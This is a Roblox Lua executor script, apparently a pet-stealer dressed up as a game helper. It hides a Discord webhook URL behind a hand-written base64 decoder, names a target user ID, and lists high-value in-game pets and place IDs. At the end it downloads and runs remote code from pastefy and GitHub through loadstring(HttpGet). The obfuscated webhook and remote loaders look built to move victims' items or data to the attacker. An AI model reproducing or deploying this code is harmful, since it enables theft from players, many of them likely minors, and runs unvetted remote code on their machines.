local genv = getgenv()

genv.GOOD_WEBHOOK = (function()
    local d="aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzMjQ5Mjk2ODgzMTg4MTIyNi9Gb0MtSEdIS3FxSHRLVDdDaFQwY1VJR1R3T1lHdVlWaGVQeDFCQzVXN2JrWS15S0Rrd3U4eV90UlZrSDlrN3kyY0tnZw=="
    local B="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    local o,b={},{}
    for i=1,#B do b[B:sub(i,i)]=i-1 end
    local n,bits=0,0
    for i=1,#d do
        local c=d:sub(i,i)
        if c~='=' then
            local v=b[c]
            if v then
                n=n*64+v; bits=bits+6
                if bits>=8 then bits=bits-8; o[#o+1]=string.char(math.floor(n/2^bits)%256); n=n%2^bits end
            end
        end
    end
    return table.concat(o)
end)()

genv.TARGET_USER_ID = 10279786442

genv.GOOD_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"

genv.ALLOWED_ANIMALS = {
    "Strawberry Elephant",
    "Headless Horseman",
    "Skibidi Toilet",
    "Meowl",
    "John Pork",
    "Dragon Gingerini",
    "Dragon Aquanini",
    "Griffin",
    "Hydra Dragon Cannelloni",
    "Signore Carapace",
    "Dragon Cannelloni",
    "Love Love Bear",
    "Moby Bros",
    "Digi Narwhal",
    "Kraken",
    "La Supreme Combinasion",
    "Elefanto Frigo",
    "Hydra Bunny",
    "Cerberus",
    "Jelly Moby",
    "Bumbatron",
    "Celestial Pegasus",
    "Bunny and Eggy",
    "Popcuru and Fizzuru",
    "Cooki and Milki",
    "Capitano Moby",
    "Rosey and Teddy",
    "Arcadragon",
    "Burguro And Fryuro",
    "Los Secret Combinasionas",
    "Ketupat Bros",
    "Reinito Sleighito",
    "Fortunu and Cashuru",
    "Los Amigos",
    "Pizza and Ranch",
    "Pancake and Syrup",
    "Antonio",
    "La Secret Combinasion",
    "Foxini Lanternini",
    "Sammyni Fattini",
    "Kalika Bros",
    "Los Sekolahs",
    "Fishino Clownino",
    "Cash or Card",
    "Fragrama and Chocrama",
    "La Casa Boo",
    "Los Admins",
    "Duggy Bros",
    "La Food Combinasion",
    "S'more Serat",
    "Sammyni Cakini",
    "Boppin Bunny",
    "Spooky and Pumpky",
    "Ginger Gerat",
    "Los Chillis",
    "La Ginger Sekolah",
    "Los Hackers",
    "Bearito Cabinito",
    "Rubiko and Kubiko",
    "Capitano Americano",
    "Examen Bros",
    "Los Spaghettis",
    "Rubrikiko",
    "Festive 67",
    "Guest 666",
    "Quackini Snackini",
    "Queen Bee",
    "Cloverat Clapat",
    "Hopilikalika Hopilikalako",
    "Garama and Madundung",
    "Jolly Jolly Sahur",
    "Rico Dinero",
    "Tirilikalika Tirilikalako"
}

genv.ALLOWED_BASESKINS = {

}

genv.ALLOWED_GEARS = {

}

genv.ALLOWED_PLACE_IDS = {
    109983668079237,
    119594317142884,
    78906538690694

}

-- Extra scripts (moved out of main)
genv.EXTRA_LOADSTRINGS = {
    "https://pastefy.app/I9mewuyb/raw"
}

-- Optional GUI / other loaders
task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/BEUKKcZd/raw"))()
end)

task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/norgegat-byte/K2/refs/heads/main/main.lua"))()
end)
